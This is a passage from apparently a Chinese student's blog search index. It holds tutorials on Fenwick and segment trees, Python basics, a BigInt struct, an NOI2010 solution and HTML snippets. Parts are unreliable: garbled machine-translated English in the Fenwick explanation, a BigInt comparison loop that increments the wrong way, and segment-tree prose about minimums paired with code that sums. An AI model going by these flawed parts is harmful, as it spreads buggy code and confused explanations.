example, 01100000, lowbit = 00100000. So if a number (consider the first four) of the binary is abcd, then the negation of (1-a) (1-b) (1-c) (1-d), then the complement of (1-a ) (1-b) (1-c) (2-d). If d is 1, there is nothing -- ||| but we know that if d is 0, we can not hold 2Σ (° △ ° |||) ︴ So we should carry. If c is also 0 then 1-b is incremented by 1 and then possibly 1-a ... until we encounter a bit that has a complement of 0, and we assume that this bit is at x This time can be found: is not the complement of the bit before x are different from their own? , After the complement of x is the same as its own 0? For example, 01101000, anti-code is 10010111, complement code is 10011000, you can see in the original number of positive fifth before the complement of the carry for the fifth so that it will not be affected, so 0 &amp; 1 = 0; However, after the original number 1, all zero&#39;s complement will be carried by 1, resulting in all the numbers in this 1 become 0, together with 0 &amp; 0 = 0, so their results are also zero; Only in this number, 0 + 1 = 1, the chain reaction stops, so this number is determined O (∩ ∩) O So after and only x this bit is 1 ...LowBitLowBit部分就是求 i 的二进制中从最低位到高位连续零的长度The LowBit part is the length of the consecutive zeros from the lowest to the highest in the binary of i代码：Code:123int LowBit(int i)&#123; return (i &amp; -i);&#125;add当我们修改A[]数组中的某一个值时 应当如何更新C[]数组呢？回想一下 区间查询的过程，再看一下上文中列出的图How do we update the C [] array when we change a value in the A [] array?Recall the process of interval query, take a look at the figure listed above代码：Code:123inline void add(int node, int value)&#123; for (int i = node; i &lt;= number; i += LowBit(i)) TreeArray[i] += value;&#125;如图：As shown:当更新A[1]时 需要向上更新C[1] ,C[2],C[4],C[8]You need to update C [1], C [2], C [4], C [8] when updating A [1]​ C[1], C[2], C[4], C[8]写为二进制 Written as binary : C[(001)],C[(010)],C[(100)],C[(1000)]​ 1(001) C[1]+=A[1] lowbit(1)=001 1+lowbit(1)=2(010) C[2]+=A[1] lowbit(2)=010 2+lowbit(2)=4(100) C[4]+=A[1] lowbit(4)=100 4+lowbit(4)=8(1000) C[8]+=A[1]GetSum下面利用C[i]数组，求A数组中前i项的和Let&#39;s use the C [i] array to find the sum of the first i terms in the A array举个例子 i=7;For example i = 7;123sum[7]=A[1]+A[2]+A[3]+A[4]+A[5]+A[6]+A[7] ; //前i项和C[4]=A[1]+A[2]+A[3]+A[4]; C[6]=A[5]+A[6]; C[7]=A[7];可以推出: sum[7]=C[4]+C[6]+C[7];Can be introduced: sum[7]=C[4]+C[6]+C[7];序号写为二进制: sum[(111)]=C[(100)]+C[(110)]+C[(111)];The serial number is written as binary: sum [(111)] = C [(100)] + C [(110)] + C [(111)];细细观察二进制 树状数组追其根本就是二进制的应用A careful observation of the binary tree array chasing it is simply a binary application代码：Code:12345inline int GetSum(int tot)&#123; int GetSum = 0; for (int i = tot; i &gt; 0; i -= LowBit(i)) GetSum += TreeArray[i]; return GetSum;&#125;对于i=7 进行演示​ 7(111) ans+=C[7] lowbit(7)=001 7-lowbit(7)=6(110) ans+=C[6] lowbit(6)=010 6-lowbit(6)=4(100) ans+=C[4] lowbit(4)=100 4-lowbit(4)=0(000)好了，解析到这里就结束了Well, the analysis is over here下面附上总代码：Code:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include&lt;algorithm&gt;#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;cstdio&gt;const int MAXN = 500000 + 10;int TreeArray[MAXN], number, qNumber;// 快读 Quick Read ; from: Wyh's Bloginline void SlowRead(int &amp;num)&#123; int Data = 0,w = 1; char ch = 0; while(ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if(ch == '-') w = -1,ch = getchar(); while(ch &gt;= '0' &amp;&amp; ch &lt;= '9') Data = Data * 10 + ch - '0',ch = getchar(); num = Data * w;&#125;int LowBit(int i)&#123; return (i &amp; -i);&#125;inline void add(int node, int value)&#123; for (int i = node; i &lt;= number; i += LowBit(i)) TreeArray[i] += value;&#125;inline int GetSum(int tot)&#123; int GetSum = 0; for (int i = tot; i &gt; 0; i -= LowBit(i)) GetSum += TreeArray[i]; return GetSum;&#125;int main()&#123; SlowRead(number);SlowRead(qNumber); for(int i = 1; i &lt;= number; i++)&#123; int d; SlowRead(d); add(i, d); &#125; for(int i = 1; i &lt;= qNumber; i++)&#123; int Kind, x, y; SlowRead(Kind); SlowRead(x); SlowRead(y); if(Kind == 1) add(x, y); else if(Kind == 2)&#123; printf("%d\n",GetSum(y)-GetSum(x - 1)); &#125; &#125; return 0; // 完美结束&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>模板</tag>
        <tag>优化</tag>
        <tag>树状数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SegmentTree线段树]]></title>
    <url>%2Farticles%2FSegmentTree%2F</url>
    <content type="text"><![CDATA[线段树 SegmentTree线段树，类似区间树，它在各个节点保存一条线段（数组中的一段子数组），主要用于高效解决连续区间的动态查询问题，由于二叉结构的特性，它基本能保持每个操作的复杂度为O(logn)Line segment tree, a similar interval tree, which saves a line segment in each node (an array of sub-array), is mainly used to efficiently solve the dynamic range of consecutive queries, due to the characteristics of binary structure, it can basically maintain each operation Complexity is O (logn)线段树的每个节点表示一个区间，子节点则分别表示父节点的左右半区间，例如父亲的区间是[a,b]，那么(c=(a+b)/2)左儿子的区间是[a,c]，右儿子的区间是[c+1,b]Each node of the segment tree represents an interval, and the subnodes represent the left and right half intervals of the parent node respectively. For example, if the father&#39;s interval is [a, b], the interval of the left son [a, c], the right son&#39;s interval is [c + 1, b]下面我们从一个经典的例子来了解线段树，问题描述如下:从数组arr[0...n-1]中查找某个数组某个区间内的最小值，其中数组大小固定，但是数组中的元素的值可以随时更新Below we learn from a classic example of the line segment tree, the problem is described as follows: From the array arr [0 ... n-1] to find the minimum value of a range of an array, which array size fixed, but the array The value of the element can be updated at any time对这个问题一个简单的解法是：遍历数组区间找到最小值，时间复杂度是O(n),额外的空间复杂度O(1)。当数据量特别大，而查询操作很频繁的时候，耗时可能会不满足需求A simple solution to this problem is: traversing the array interval to find the minimum, the time complexity is O (n), additional space complexity O (1). When the amount of data is particularly large, and query operations are frequent, time-consuming may not meet the demand另一种解法：使用一个二维数组来保存提前计算好的区间[i,j]内的最小值，那么预处理时间为O(n^2)，查询耗时O(1), 但是需要额外的O(n^2)空间，当数据量很大时，这个空间消耗是庞大的，而且当改变了数组中的某一个值时，更新二维数组中的最小值也很麻烦Another solution: using a two-dimensional array to save the minimum value of the interval [i, j] calculated in advance, then the preprocessing time is O (n ^ 2), the query takes O (1) O (n ^ 2) space, this space consumption is huge when the amount of data is large, and updating the minimum value in the two-dimensional array is also troublesome when changing one of the values in the array我们可以用线段树来解决这个问题：预处理耗时O(n)，查询、更新操作O(logn)，需要额外的空间O(n)。根据这个问题我们构造如下的二叉树We can solve this problem with a segment tree: Preprocessing O (n), query, update operation O (logn), requires extra space O (n). According to this problem we construct the following binary tree叶子节点是原始组数arr中的元素非叶子节点代表它的所有子孙叶子节点所在区间的最小值The leaf node is the element in the original group arrThe non-leaf node represents the minimum of the range of all its children&#39;s leaf nodes例如对于数组[2, 5, 1, 4, 9, 3]可以构造如下的二叉树（背景为白色表示叶子节点，非叶子节点的值是其对应数组区间内的最小值，例如根节点表示数组区间arr[0...5]内的最小值是1）For example, an array [2, 5, 1, 4, 9, 3] can construct a binary tree as follows (the background is a white leaf node, and the value of a non-leaf node is the minimum value within its corresponding array interval. For example, the root node represents an array interval The minimum value in arr [0 ... 5] is 1)由于线段树的父节点区间是平均分割到左右子树，因此线段树是完全二叉树，对于包含n个叶子节点的完全二叉树，它一定有n-1个非叶节点，总共2n-1个节点，因此存储线段是需要的空间复杂度是O(n)。The segment tree is a complete binary tree because the parent interval of the segment tree is evenly divided into left and right subtrees. For a complete binary tree containing n leaf nodes, it must have n-1 non-leaf nodes, for a total of 2n-1 nodes, Therefore, the space complexity required to store a line segment is O (n).代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include&lt;cstdio&gt;#include&lt;cmath&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;const int MAXN = 100000;struct Node&#123; long long value,LasyTag;&#125;SegmentTree[MAXN*4+5];long long a[MAXN + 10];int RangeLength,Question_Number,t,Kind,y,k;//建树 build treevoid SegmentTree_build(int root,long long arr[],int istart,int iend)&#123; SegmentTree[root].LasyTag=0; if(istart==iend) SegmentTree[root].value=arr[istart]; else&#123; int Rangemid=(istart+iend)/2; SegmentTree_build(root*2,arr,istart,Rangemid); SegmentTree_build(root*2+1,arr,Rangemid+1,iend); SegmentTree[root].value=SegmentTree[root*2].value+SegmentTree[root*2+1].value; &#125;&#125;//插入LasyTag Insert LasyTagvoid SegmentTree_pushDown(int root,int start,int end)&#123; if(SegmentTree[root].LasyTag!=0)&#123; SegmentTree[root*2].LasyTag+=SegmentTree[root].LasyTag; SegmentTree[root*2+1].LasyTag+=SegmentTree[root].LasyTag; int Rangemid=(end+start)/2; SegmentTree[root*2].value+=SegmentTree[root].LasyTag*(Rangemid-start+1); SegmentTree[root*2+1].value+=SegmentTree[root].LasyTag*(end-Rangemid); SegmentTree[root].LasyTag=0; &#125;&#125;//区间查询 Query Rangelong long SegmentTree_query(int root,int Rangenstart,int Rangenend,int Rangeqstart,int Rangeqend)&#123; if(Rangeqstart&gt;Rangenend||Rangeqend&lt;Rangenstart) return 0; if(Rangeqstart&lt;=Rangenstart&amp;&amp;Rangeqend&gt;=Rangenend) return SegmentTree[root].value; SegmentTree_pushDown(root,Rangenstart,Rangenend); int Rangemid=(Rangenstart+Rangenend)/2; return SegmentTree_query(root*2,Rangenstart,Rangemid,Rangeqstart,Rangeqend)+SegmentTree_query(root*2+1,Rangemid+1,Rangenend,Rangeqstart,Rangeqend);&#125;//赋值 Assignmentvoid SegmentTree_update(int root,int Rangenstart,int Rangenend,int Rangeustart,int Rangeuend,int addvalue)&#123; if(Rangeustart&gt;Rangenend||Rangeuend&lt;Rangenstart) return; if(Rangeustart&lt;=Rangenstart&amp;&amp;Rangeuend&gt;=Rangenend)&#123; SegmentTree[root].LasyTag+=addvalue; SegmentTree[root].value+=addvalue*(Rangenend-Rangenstart+1); return; &#125; SegmentTree_pushDown(root,Rangenstart,Rangenend); int Rangemid=(Rangenstart+Rangenend)/2; SegmentTree_update(root*2,Rangenstart,Rangemid,Rangeustart,Rangeuend,addvalue); SegmentTree_update(root*2+1,Rangemid+1,Rangenend,Rangeustart,Rangeuend,addvalue); SegmentTree[root].value=SegmentTree[root*2].value+SegmentTree[root*2+1].value;&#125;int main()&#123; scanf("%lld%lld",&amp;RangeLength,&amp;Question_Number); for(int i=1;i&lt;=RangeLength;i++) scanf("%lld",&amp;a[i]); SegmentTree_build(1,a,1,RangeLength); for(int i=1;i&lt;=Question_Number;i++)&#123; scanf("%lld",&amp;t); if(t==1)&#123; scanf("%lld%lld%lld",&amp;Kind,&amp;y,&amp;k); SegmentTree_update(1,1,RangeLength,Kind,y,k); &#125;if(t==2)&#123; scanf("%lld%lld",&amp;Kind,&amp;y); printf("%lld\n",SegmentTree_query(1,1,RangeLength,Kind,y)); &#125; &#125; return 0; // Wonderful End&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>线段树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python入门（一）]]></title>
    <url>%2Farticles%2Fpython1%2F</url>
    <content type="text"><![CDATA[Python 是一种面向对象的解释型计算机程序设计语言，由荷兰人Guido van Rossum于1989年发明，第一个公开发行版发行于1991年。Python是纯粹的自由软件， 源代码和解释器CPython遵循 GPL(GNU General Public License)协议。Python语法简洁清晰，特色之一是强制用空白符(white space)作为语句缩进。Python具有丰富和强大的库。它常被昵称为胶水语言，能够把用其他语言制作的各种模块（尤其是C/C++）很轻松地联结在一起。常见的一种应用情形是，使用Python快速生成程序的原型（有时甚至是程序的最终界面），然后对其中有特别要求的部分，用更合适的语言改写，比如3D游戏中的图形渲染模块，性能要求特别高，就可以用C/C++重写，而后封装为Python可以调用的扩展类库。需要注意的是在您使用扩展类库时可能需要考虑平台问题，某些可能不提供跨平台的实现。-----以上来自某度百科-----Python其实是一个十分好用的语言，有点常识的人用过的人都知道他的简洁First Python program!12# !/media/shan666/Filesprint "Hello World"tips> &#39;#&#39;后面的代表注释，你加上或不加没有什么影响print 是一个函数，用来向屏幕上打印东西。现在，问题来了，我们只是写出了19个字符而已，有什么用呢？？我们接下来就要在电脑上运行一下新建一个文件HelloWorld.py接下来，我们cd到相关目录，运行命令：python HelloWorld.py这就是我们的第一个Python程序了虽然这些代码很简单(的确很简单)，也没什么效果，但是这毕竟是万里长征第一步。数据类型计算机顾名思义就是可以做数学计算的机器，因此，计算机程序理所当然地可以处理各种数值。但是，计算机能处理的远不止数值，还可以处理文本、图形、音频、视频、网页等各种各样的数据，不同的数据，需要定义不同的数据类型。在Python中，能够直接处理的数据类型有以下几种：整数Python可以处理任意大小的整数，当然包括负整数，在程序中的表示方法和数学上的写法一模一样，例如：1，100，-8080，0，等等。计算机由于使用二进制，所以，有时候用十六进制表示整数比较方便，十六进制用0x前缀和0-9，a-f表示，例如：0xff00，0xa5b4c3d2，等等。浮点数浮点数也就是小数，之所以称为浮点数，是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的，比如，1.23x109和12.3x108是完全相等的。浮点数可以用数学写法，如1.23，3.14，-9.01，等等。但是对于很大或很小的浮点数，就必须用科学计数法表示，把10用e替代，1.23x109就是1.23e9，或者12.3e8，0.000012可以写成1.2e-5，等等。整数和浮点数在计算机内部存储的方式是不同的，整数运算永远是精确的（除法难道也是精确的？是的！），而浮点数运算则可能会有四舍五入的误差。字符串字符串是以单引号&#39;或双引号&quot;括起来的任意文本，比如&#39;abc&#39;，&quot;xyz&quot;等等。请注意，&#39;&#39;或&quot;&quot;本身只是一种表示方式，不是字符串的一部分，因此，字符串&#39;abc&#39;只有a，b，c这3个字符。如果&#39;本身也是一个字符，那就可以用&quot;&quot;括起来，比如&quot;I&#39;m OK&quot;包含的字符是I，&#39;，m，空格，O，K这6个字符。如果字符串内部既包含&#39;又包含&quot;怎么办？可以用转义字符\来标识，比如：1'I\'m \"OK\"!'表示的字符串内容是：1I'm "OK"!转义字符\可以转义很多字符，比如\n表示换行，\t表示制表符，字符\本身也要转义，所以\\表示的字符就是\布尔值布尔值和布尔代数的表示完全一致，一个布尔值只有True、False两种值，要么是True，要么是False，在Python中，可以直接用True、False表示布尔值（请注意大小写），也可以通过布尔运算计算出来：12345678&gt;&gt;&gt; TrueTrue&gt;&gt;&gt; FalseFalse&gt;&gt;&gt; 3 &gt; 2True&gt;&gt;&gt; 3 &gt; 5False布尔值可以用and、or和not运算。and运算是与运算，只有所有都为True，and运算结果才是True：12345678&gt;&gt;&gt; True and TrueTrue&gt;&gt;&gt; True and FalseFalse&gt;&gt;&gt; False and FalseFalse&gt;&gt;&gt; 5 &gt; 3 and 3 &gt; 1Trueor运算是或运算，只要其中有一个为True，or运算结果就是True：12345678&gt;&gt;&gt; True or TrueTrue&gt;&gt;&gt; True or FalseTrue&gt;&gt;&gt; False or FalseFalse&gt;&gt;&gt; 5 &gt; 3 or 1 &gt; 3Truenot运算是非运算，它是一个单目运算符，把True变成False，False变成True：123456&gt;&gt;&gt; not TrueFalse&gt;&gt;&gt; not FalseTrue&gt;&gt;&gt; not 1 &gt; 2True布尔值经常用在条件判断中，比如：1234if age &gt;= 18: print('adult')else: print('teenager')空值空值是Python里一个特殊的值，用None表示。None不能理解为0，因为0是有意义的，而None是一个特殊的空值。此外，Python还提供了列表、字典等多种数据类型，还允许创建自定义数据类型，我们后面会继续讲到。变量变量的概念基本上和初中代数的方程变量是一致的，只是在计算机程序中，变量不仅可以是数字，还可以是任意数据类型。变量在程序中就是用一个变量名表示了，变量名必须是大小写英文、数字和_的组合，且不能用数字开头，比如：1a = 1变量a是一个整数。1t_007 = 'T007'变量t_007是一个字符串。1Answer = True变量Answer是一个布尔值True。在Python中，等号=是赋值语句，可以把任意数据类型赋值给变量，同一个变量可以反复赋值，而且可以是不同类型的变量，这种变量本身类型不固定的语言称之为动态语言，与之对应的是静态语言。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下（// 表示注释）：12int a = 123; // a是整数类型变量a = "ABC"; // 错误：不能把字符串赋给整型变量和静态语言相比，动态语言更灵活，就是这个原因。请不要把赋值语句的等号等同于数学的等号。比如下面的代码：12x = 10x = x + 2如果从数学上理解x = x + 2那无论如何是不成立的，在程序中，赋值语句先计算右侧的表达式x + 2，得到结果12，再赋给变量x。由于x之前的值是10，重新赋值后，x的值变成12。最后，理解变量在计算机内存中的表示也非常重要。当我们写：1a = 'ABC'时，Python解释器干了两件事情：在内存中创建了一个&#39;ABC&#39;的字符串；在内存中创建了一个名为a的变量，并把它指向&#39;ABC&#39;。也可以把一个变量a赋值给另一个变量b，这个操作实际上是把变量b指向变量a所指向的数据(未完待续)]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++教程]]></title>
    <url>%2Farticles%2Fcppteach%2F</url>
    <content type="text"><![CDATA[本文是关于C++的基础C++ 是一种中级语言，它是由 Bjarne Stroustrup 于 1979 年在贝尔实验室开始设计开发的。C++ 进一步扩充和完善了 C 语言，是一种面向对象的程序设计语言。C++ 可运行于多种平台上，如 Windows、MAC 操作系统以及 UNIX 的各种版本。本教程通过通俗易懂的语言来讲解 C++ 编程语言。C++教程：From--http://www.runoob.com]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BigInt]]></title>
    <url>%2Farticles%2FBigInt%2F</url>
    <content type="text"><![CDATA[高精度是在算法竞赛中一种十分常用的算法，本文就来介绍一下有关高精度的一些知识我们知道，计算机内部直接用int或double等数据类型储存数字是有范围限制的，即当数据运算大小过大后，计算机将会出现溢出情况，使得计算结果不够精确。为了能够使计算机精确地计算高位的数字，我们需要学会使用高精度乘法当然再本地，你可以用一些__int128之类的定义，但是你在NOIP中用个试试23333333事实上，高精度乘法就是通过编程的方法，把我们小学时候我们学过的数学乘法运算的步骤在计算机上完美的演示一遍而已高精加回忆我们小学时候的列数式加法：1 32 8+----------------4 1这当然是一种十分有效的计算方法2333现在我们用代码的眼光重新审视一下我们加法的步骤：a[1] a[2]1 3b[1] b[2]2 8+----------------ans[1] ans[2]4 1首先，进行a[2] + b[2] 的操作，得到ans[2] = 11, ans[2] % 10 得到1 ,向下一位进1，上一位没有进位得1。 继续，进行a[1] + b[1] 的操作，得到ans[1] = 3 , ans[1] % 10 得到3 ,向下一位进0，加上一位的进位1得4代码：1234567//////高精度加法//////while(lenc &lt;=a1_len || lenc &lt;=b1_len)&#123; c[lenc] = a[lenc] + b[lenc] + x; //两数相加 x = c[lenc]/10; //要进的位,注意，x要初始化为0 c[lenc] = c[lenc] % 10; //进位后的数 lenc++; //数组下标加1&#125;高精减学会了高精加，高精减就很容易了唯一要注意的一点就是输出的时候要带符号代码：12345678while(lenc &lt;= a_lenth || i &lt;= b_lenth)&#123; if(a[lenc] &lt; b[lenc])&#123; a[lenc + 1]--; a[lenc] += 10; &#125; c[lenc] = a[lenc] - b[lenc]; lenc++;&#125;高精乘/除略最后我们将所有的操作封装在一起，就会得到一个相当长的BigInt：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108struct BigInt&#123; static const int BASE=100000000; static const int WIDTH=8; vector&lt;int&gt; s; //value BigInt(long long num=0)&#123; *this = num;&#125; BigInt operator = (long long num)&#123; s.clear(); do&#123; s.push_back(num%BASE); num/=BASE; &#125;while(num&gt;0); return *this; &#125; BigInt operator = (const string&amp; str)&#123; s.clear() ; int x,len = (str.length()-1)/WIDTH + 1; for(int i=0;i&lt;len;i++)&#123; int end = str.length() - i*WIDTH; int start = max(0,end - WIDTH); sscanf(str.substr(start,end-start).c_str(),"%d",&amp;x); s.push_back(x); &#125; return *this; &#125; //input&amp;output friend ostream&amp; operator &lt;&lt; (ostream &amp;out, const BigInt&amp; x)&#123; out &lt;&lt; x.s.back(); for(int i=x.s.size()-2;i&gt;=0;i--)&#123; char buf[20]; sprintf(buf,"%08d",x.s[i]); for(int j=0;j&lt;strlen(buf);j++) out &lt;&lt; buf[j]; &#125; return out; &#125; friend istream&amp; operator &gt;&gt;(istream &amp;in, BigInt&amp; x)&#123; string s; if(!(in&gt;&gt;s)) return in; x=s; return in; &#125; //compare bool operator &lt; (const BigInt&amp; b) const &#123; if(s.size()!=b.s.size()) return s.size() &lt; b.s.size(); for(int i=s.size()-1;i&gt;=0;i++) if(s[i]!=b.s[i]) return s[i] &lt; b.s[i]; return false;//equal &#125; bool operator &gt; (const BigInt&amp; b) const &#123;return b &lt; *this;&#125; bool operator &lt;= (const BigInt&amp; b) const &#123;return !(b &lt; *this);&#125; bool operator &gt;= (const BigInt&amp; b) const &#123;return !(*this &lt; b);&#125; bool operator != (const BigInt&amp; b) const &#123;return b &lt; *this || *this &lt; b;&#125; bool operator == (const BigInt&amp; b) const &#123;return !(b &lt; *this) &amp;&amp; !(*this &lt; b);&#125; //calculate BigInt operator +(const BigInt&amp; b) const &#123; BigInt c; c.s.clear(); for(int i=0,g=0;;i++)&#123; if(g==0 &amp;&amp; i&gt;=s.size() &amp;&amp; i&gt;=b.s.size()) break; int x=g; if(i&lt;s.size()) x+=s[i]; if(i&lt;b.s.size()) x+=b.s[i]; c.s.push_back(x%BASE); g = x/BASE; &#125; return c; &#125; BigInt operator +=(const BigInt&amp; b)&#123; *this = *this + b; return *this; &#125; BigInt operator -(const BigInt&amp; b) const &#123; BigInt c; c.s.clear(); for(int i=0,g=0;;i++)&#123; if(g==0 &amp;&amp; i&gt;=s.size() &amp;&amp; i&gt;=b.s.size()) break; int x=g; if(i&lt;s.size()) x+=s[i]; if(i&lt;b.s.size()) x-=b.s[i]; x+=BASE; c.s.push_back(x%BASE); g = x/BASE - 1; &#125; return c; &#125; BigInt operator * (const BigInt&amp; b) const &#123; BigInt c; c.s.clear(); BigInt g=0; for(int i=0;;i++)&#123; if(g.s.size()==0 &amp;&amp; i&gt;=s.size()+b.s.size()-1) break; BigInt x; x.s.clear() ; for(int j=0;j&lt;g.s.size();j++) x.s.push_back(g.s[j]); if(i&lt;s.size()+b.s.size()-1)&#123; for(int j = max(0 , i-(int)s.size()+1);j&lt;=min(i,(int)b.s.size()-1);j++)&#123; BigInt t = (long long)b.s[j]*s[i-j]; x += t; &#125; &#125; c.s.push_back(x.s[0]); g.s.clear(); if(x.s.size()&gt;1) for(int j=1;j&lt;x.s.size();j++) g.s.push_back(x.s[j]); &#125; return c; &#125;&#125;s;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>高精度</tag>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[NOI2010]能量采集]]></title>
    <url>%2Farticles%2FNOI2010-Plant%2F</url>
    <content type="text"><![CDATA[题目链接题目描述栋栋有一块长方形的地，他在地上种了一种能量植物，这种植物可以采集太阳光的能量。在这些植物采集能量后，栋栋再使用一个能量汇集机器把这些植物采集到的能量汇集到一起。栋栋的植物种得非常整齐，一共有n列，每列有m棵，植物的横竖间距都一样，因此对于每一棵植物，栋栋可以用一个坐标(x, y)来表示，其中x的范围是1至n，表示是在第x列，y的范围是1至m，表示是在第x列的第y棵。由于能量汇集机器较大，不便移动，栋栋将它放在了一个角上，坐标正好是(0, 0)。能量汇集机器在汇集的过程中有一定的能量损失。如果一棵植物与能量汇集机器连接而成的线段上有k棵植物，则能 量的损失为2k + 1。例如，当能量汇集机器收集坐标为(2, 4)的植物时，由于连接线段上存在一棵植物(1, 2)，会产生3的能量损失。注意，如果一棵植物与能量汇集机器连接的线段上没有植物，则能量损失为1。现在要计算总的能量损失。在这个例子中，总共产生了36的能量损失。输入输出格式输入格式：仅包含一行，为两个整数n和m。输出格式：仅包含一个整数，表示总共产生的能量损失。输入输出样例输入样例#1：123456【样例输入1】5 4【样例输入2】3 4输出样例#1：12345【样例输出1】36【样例输出2】20说明对于10%的数据：1 ≤ n, m ≤ 10；对于50%的数据：1 ≤ n, m ≤ 100；对于80%的数据：1 ≤ n, m ≤ 1000；对于90%的数据：1 ≤ n, m ≤ 10,000；对于100%的数据：1 ≤ n, m ≤ 100,000。首先看到这道题，作为一个数竞dalao蒟蒻，首先想到的就是建系，但是建系的话就更麻烦了，所以说我们需要搞到一个更好的方法| | o (4,2) | / | o (2,1) | / o ---- ----------------懒得画图再传了，就用这个将就一些吧注意，我们看到(4,2)这个点，它与原点构成的一次函数(正比例函数)的解析式为f(x) = 2x,那么说他一定经过(2,1)回到问题上来，我们要求的某个点能量损失事实上就是求他与原点构成的一次函数经过的整数点。一次函数经过的整数点怎么算呢?经过我们的一番严密的，细致的思索，终于得出----gcd(x, y)。具体为什么呢，请自行推理所以说，我们就写出了第一个暴力解法1234567int Solve()&#123; LL ans = 0; for(int i = 1; i &lt;= n; i++) for(int j = 1; j &lt;= m; j++) ans += gcd(i, j); return ans * 2 - m * n;&#125;但是，明显这样做不是出题人的意图。毕竟暴力就可以水过的题不会再NOI中出现我们怎么优化暴力呢?自己看就行了本题就是小学奥术题，自己翻翻一些小学奥术教材就可以了1234567891011121314151617181920212223242526272829303132333435// 时间复杂度: O(nlogn)#include&lt;iostream&gt;#include&lt;cstdio&gt;#define LL long longusing namespace std;const int MAXN = 100001;LL size,m,mu[MAXN],Answer,tot;LL p[MAXN],np[MAXN];void get_mu()&#123; mu[1] = 1; for(int i = 2; i &lt;= size; i++)&#123; if(!np[i]) p[++p[0]] = i,mu[i] = -1; for(int j = 1; j &lt;= p[0] &amp;&amp; p[j]*i &lt;= size; j++)&#123; int k = p[j]*i; np[k] = 1; if(!(i % p[j])) break; mu[k] = -mu[i]; &#125; &#125;&#125;int main()&#123; cin &gt;&gt; size &gt;&gt; m; get_mu(); for(int d = 1; d &lt;= size; d++) for(int i = 1; i &lt;= min(size, m) / d; i++) Answer += d * mu[i] * (size / (d * i)) * (m / (d * i)); cout &lt;&lt; Answer * 2 - size * m; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>数论</tag>
        <tag>欧拉函数</tag>
        <tag>gcd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些写文章用的Html语法]]></title>
    <url>%2Farticles%2Fmarkdown%2F</url>
    <content type="text"><![CDATA[在写一些Markdown的文章中，经常会发现一些问题--markdown并不滋磁那么多的用法(不要说我t** y**** t** s*****)，其实再Github page中也是滋磁Html的语法的，这也极大弥补了Markdown的不足性。当然，写一些平常的Mardown文档是不需要那么多Html的，这仅仅是锦上添花而已23333话不多说，下面就是Html的几种常在文章里用到的用法文本框 代码：123&lt;input class='input-text' type='text' placeholder='Text'&gt;&lt;input class='input-search' type='search' placeholder='Search'&gt;&lt;textarea class='input-textarea' placeholder='Text Area'&gt;&lt;/textarea&gt;标签 Radio Radio Checkbox Toggle 1234567&lt;label class='input-label'&gt;&lt;input class='input-radio' type='radio' name='radio'&gt; Radio&lt;/label&gt;&lt;label class='input-label'&gt;&lt;input class='input-radio' type='radio' name='radio' checked&gt; Radio&lt;/label&gt;&lt;label class='input-label'&gt;&lt;input class='input-checkbox' type='checkbox' checked&gt; Checkbox&lt;/label&gt;&lt;label class='input-label'&gt;&lt;input class='input-toggle' type='checkbox' checked&gt; Toggle&lt;/label&gt;&lt;input class='input-range' type='range'&gt;按钮Do it Another Bad_End&#39;s Blog12345&lt;div class='block'&gt; &lt;button class='inline-block btn'&gt;Do it&lt;/button&gt; &lt;button class='inline-block btn'&gt;Another&lt;/button&gt; &lt;button class='inline-block btn'&gt;&lt;a href="https://bad-end.github.io"&gt;Bad_End's Blog&lt;/a&gt;&lt;/button&gt;&lt;/div&gt;文件树A DirectoryNested DirectoryFile oneCollapsed Nested DirectoryFile oneFile oneFile three .selected!.icon-file-text.icon-file-symlink-file12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;ul class=&apos;list-tree has-collapsable-children&apos;&gt; &lt;li class=&apos;list-nested-item&apos;&gt; &lt;div class=&apos;list-item&apos;&gt; &lt;span class=&apos;icon icon-file-directory&apos;&gt;A Directory&lt;/span&gt; &lt;/div&gt; &lt;ul class=&apos;list-tree&apos;&gt; &lt;li class=&apos;list-nested-item&apos;&gt; &lt;div class=&apos;list-item&apos;&gt; &lt;span class=&apos;icon icon-file-directory&apos;&gt;Nested Directory&lt;/span&gt; &lt;/div&gt; &lt;ul class=&apos;list-tree&apos;&gt; &lt;li class=&apos;list-item&apos;&gt; &lt;span class=&apos;icon icon-file-text&apos;&gt;File one&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li class=&apos;list-nested-item collapsed&apos;&gt; &lt;div class=&apos;list-item&apos;&gt; &lt;span class=&apos;icon icon-file-directory&apos;&gt;Collapsed Nested Directory&lt;/span&gt; &lt;/div&gt; &lt;ul class=&apos;list-tree&apos;&gt; &lt;li class=&apos;list-item&apos;&gt; &lt;span class=&apos;icon icon-file-text&apos;&gt;File one&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li class=&apos;list-item&apos;&gt; &lt;span class=&apos;icon icon-file-text&apos;&gt;File one&lt;/span&gt; &lt;/li&gt; &lt;li class=&apos;list-item selected&apos;&gt; &lt;span class=&apos;icon 